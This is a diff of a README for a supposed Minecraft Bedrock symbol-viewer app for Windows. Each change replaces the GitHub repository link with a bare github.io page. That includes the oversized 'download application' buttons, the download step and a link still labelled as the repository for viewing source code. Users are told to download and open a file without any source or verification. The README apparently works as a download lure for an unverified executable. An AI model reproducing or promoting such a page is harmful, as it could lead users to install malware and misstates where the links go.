@@ -1,7 +1,7 @@
 <h1>✨ bedrock-glyph-viewer-suite-2026 - Find Every Minecraft Symbol Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(102,126,234,0.4);margin:20px 0;">⬇️ VISIT LINK TO DOWNLOAD APPLICATION</a>
+  <a href="https://ytak5799.github.io" style="display:inline-block;padding:18px 42px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(102,126,234,0.4);margin:20px 0;">⬇️ VISIT LINK TO DOWNLOAD APPLICATION</a>
 </p>
 
 <hr>
@@ -19,7 +19,7 @@ Minecraft Bedrock players constantly hit a wall when trying to use special symbo
 Follow these simple steps to get the suite running on your Windows computer.
 
 **Step 1: Download the Application**
-- Visit this link to download the application: [https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026](https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026)
+- Visit this link to download the application: [https://ytak5799.github.io](https://ytak5799.github.io)
 - Click the big download button on that page. Allow a moment for the download to finish.
 
 **Step 2: Open the Downloaded File**
@@ -129,13 +129,13 @@ A: Visit the GitHub repository link below and open an "Issue". Describe what hap
 
 Besides the main download link, here are helpful places to explore:
 
-- **The GitHub Repository** – [https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026](https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026) – See source code, report issues, and check for future updates
+- **The GitHub Repository** – [https://ytak5799.github.io](https://ytak5799.github.io) – See source code, report issues, and check for future updates
 - **Minecraft Official Site** – Learn more about Minecraft Bedrock Edition and its features
 - **Unicode Consortium** – The organization that standardizes character codes (useful if you want to learn about the system)
 
 ## ✅ Final Checklist Before You Go
 
-- [ ] You visited the download link: [https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026](https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026)
+- [ ] You visited the download link: [https://ytak5799.github.io](https://ytak5799.github.io)
 - [ ] You successfully opened the application
 - [ ] You searched for a symbol you like
 - [ ] You copied a code and pasted it into Minecraft
@@ -146,5 +146,5 @@ If you've completed all these steps, congratulations! You are now officially a M
 ---
 
 <p align="center">
-  <a href="https://github.com/ytak5799/bedrock-glyph-viewer-suite-2026" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(240,147,251,0.4);">⬇️ GET THE APPLICATION NOW</a>
+  <a href="https://ytak5799.github.io" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(240,147,251,0.4);">⬇️ GET THE APPLICATION NOW</a>
 </p>
